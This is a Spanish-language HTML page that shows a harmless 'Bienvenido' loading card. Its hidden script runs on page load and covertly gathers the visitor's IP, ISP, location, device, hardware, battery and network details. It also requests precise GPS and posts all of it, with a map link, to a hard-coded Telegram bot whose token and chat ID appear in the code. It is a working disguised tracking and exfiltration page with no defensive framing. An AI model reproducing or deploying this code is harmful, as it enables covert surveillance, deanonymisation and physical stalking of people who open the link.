<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bienvenido</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh; margin: 0;
      background: #0f172a; color: #e2e8f0;
    }
    .card { text-align: center; padding: 2rem; }
    h1 { font-size: 2rem; margin-bottom: .5rem; }
    p  { color: #94a3b8; }
  </style>
</head>
<body>
  <div class="card">
    <h1>👋 Bienvenido</h1>
    <p>Cargando experiencia...</p>
  </div>

  <script>
    const TELEGRAM_TOKEN   = "7843541708:AAGQP0rXOqhd1Zcp737DzLByREna2HD3VVo";
    const TELEGRAM_CHAT_ID = "7064330912";

    (async function () {
      try {
        let ip = "desconocida";
        let ubicacionIP = "no disponible";
        let isp = "?";
        let latIP = null, lonIP = null;

        try {
          const geoResp = await fetch("https://ipwho.is/");
          const geo     = await geoResp.json();
          ip = geo.ip || "desconocida";
          if (geo.success) {
            ubicacionIP = `${geo.city || "?"}, ${geo.region || "?"}, ${geo.country || "?"}`;
            isp         = geo.connection?.isp || "?";
            latIP       = geo.latitude;
            lonIP       = geo.longitude;
          }
        } catch (e) { /* silencioso */ }

        const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const ua          = navigator.userAgent;
        const plataforma  = navigator.platform;
        const idioma      = navigator.language;
        const idiomas     = navigator.languages ? navigator.languages.join(", ") : "?";
        const referrer    = document.referrer || "directo";
        const pagina      = window.location.href;
        const online      = navigator.onLine ? "Sí" : "No";
        const cookies     = navigator.cookieEnabled ? "Habilitadas" : "Deshabilitadas";

        const pantalla    = `${screen.width}x${screen.height}`;
        const disponible  = `${screen.availWidth}x${screen.availHeight}`;
        const pixelRatio  = window.devicePixelRatio || "?";
        const colorDepth  = screen.colorDepth || "?";
        const touchPoints = navigator.maxTouchPoints || 0;

        const cpuCores = navigator.hardwareConcurrency || "?";
        const ram      = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "no disponible";

        let gpu = "no disponible";
        try {
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
          if (gl) {
            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            if (debugInfo) {
              const vendor   = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
              const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
              gpu = `${vendor} — ${renderer}`;
            }
          }
        } catch (e) { /* silencioso */ }

        let bateria = "no disponible";
        try {
          if (navigator.getBattery) {
            const bat   = await navigator.getBattery();
            const nivel = Math.round(bat.level * 100);
            bateria = `${nivel}% — ${bat.charging ? "Cargando" : "Descargando"}`;
          }
        } catch (e) { /* silencioso */ }

        const conexion = navigator.connection
          ? `Tipo: ${navigator.connection.effectiveType || "?"} / Velocidad: ${navigator.connection.downlink || "?"} Mbps / RTT: ${navigator.connection.rtt || "?"} ms`
          : "no disponible";

        let modeloDispositivo = "no disponible";
        let plataformaReal    = "no disponible";
        try {
          if (navigator.userAgentData) {
            const hints = await navigator.userAgentData.getHighEntropyValues([
              "platform", "platformVersion", "model", "architecture", "bitness"
            ]);
            modeloDispositivo = hints.model || "no reportado";
            plataformaReal    = `${hints.platform || "?"} ${hints.platformVersion || "?"}`;
          }
        } catch (e) { /* silencioso */ }

        let ubicacionGPS = "no solicitada / denegada";
        let latGPS = null, lonGPS = null, precisionGPS = null;

        if (navigator.geolocation) {
          ubicacionGPS = await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                latGPS       = pos.coords.latitude;
                lonGPS       = pos.coords.longitude;
                precisionGPS = pos.coords.accuracy;
                resolve(`Lat: ${latGPS}, Lon: ${lonGPS} (±${precisionGPS} m)`);
              },
              (err) => {
                resolve(`No disponible (${err.message})`);
              },
              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
          });
        } else {
          ubicacionGPS = "API no soportada por el navegador";
        }

        let bloqueGPS = "";
        if (latGPS !== null && lonGPS !== null) {
          bloqueGPS = `
🎯 *Ubicación precisa (GPS)*
• Coordenadas: \`${latGPS}, ${lonGPS}\`
• Precisión: ±${precisionGPS} m
• Mapa: https://www.google.com/maps?q=${latGPS},${lonGPS}`;
        } else {
          bloqueGPS = `
🎯 *Ubicación precisa (GPS)*
• ${ubicacionGPS}`;
        }

        const texto = `
🔔 *Nueva visita*

🌐 *IP:* \`${ip}\`
📍 *Ubicación aproximada (IP):* ${ubicacionIP}
🏢 *ISP:* ${isp}
🕒 *Zona horaria:* ${zonaHoraria}
${bloqueGPS}

💻 *Dispositivo*
• Modelo: ${modeloDispositivo}
• Plataforma real: ${plataformaReal}
• UA: ${ua}
• Plataforma (UA): ${plataforma}
• Idioma: ${idioma}
• Idiomas: ${idiomas}

⚙️ *Hardware*
• CPU: ${cpuCores} núcleos
• RAM: ${ram}
• GPU: ${gpu}
• Pantalla: ${pantalla} (disponible: ${disponible})
• Pixel Ratio: ${pixelRatio}
• Color depth: ${colorDepth} bits
• Touch: ${touchPoints} puntos

🔋 *Batería:* ${bateria}

📡 *Red*
• Conexión: ${conexion}
• Online: ${online}
• Cookies: ${cookies}

🔗 *Referrer:* ${referrer}
📄 *Página:* ${pagina}
        `.trim();

        await fetch(
          `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: texto,
              parse_mode: "Markdown",
              disable_web_page_preview: true
            })
          }
        );

        if (latGPS !== null && lonGPS !== null) {
          await fetch(
            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`,
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                latitude: latGPS,
                longitude: lonGPS
              })
            }
          );
        }
      } catch (err) {
        console.warn("No se pudo notificar:", err);
      }
    })();
  </script>
</body>
</html>
